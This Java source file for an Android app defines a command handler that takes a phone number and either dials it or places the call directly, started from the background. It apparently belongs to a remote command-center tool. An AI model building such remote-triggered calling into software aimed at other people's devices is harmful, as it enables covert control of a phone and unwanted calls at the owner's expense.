package com.theah64.xrob.commandcenter.commands;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;

/**
 * Created by theapache64 on 9/10/16.
 */

public class RingBabyCommand extends BaseCommand {

    private static final String FLAG_NUMBER = "n";
    private static final String FLAG_DIAL = "d";
    private static final String FLAG_CALL = "c";

    private static final Options options = new Options()
            .addOption(FLAG_NUMBER, true, "Number to be dialed")
            .addOption(FLAG_CALL, false, "To call")
            .addOption(FLAG_DIAL, false, "To just dial");

    public RingBabyCommand(String command) throws CommandException, ParseException {
        super(command);
    }

    @Override
    public void handle(Context context, Callback callback) {

        final String numberTobeDialed = getCmd().getOptionValue(FLAG_NUMBER);
        if (numberTobeDialed != null) {

            final Intent numberIntent;

            if (getCmd().hasOption(FLAG_CALL)) {
                numberIntent = new Intent(Intent.ACTION_CALL);
            } else {
                numberIntent = new Intent(Intent.ACTION_DIAL);
            }

            numberIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            numberIntent.addFlags(Intent.FLAG_FROM_BACKGROUND);

            numberIntent.setData(Uri.parse("tel:" + numberTobeDialed));

            context.startActivity(numberIntent);

            callback.onSuccess("Action processed : " + numberIntent.getAction() + ":" + numberTobeDialed);
        } else {
            callback.onError("Number to be dialed not specified");
        }

    }

    @Override
    public Options getOptions() {
        return options;
    }
}
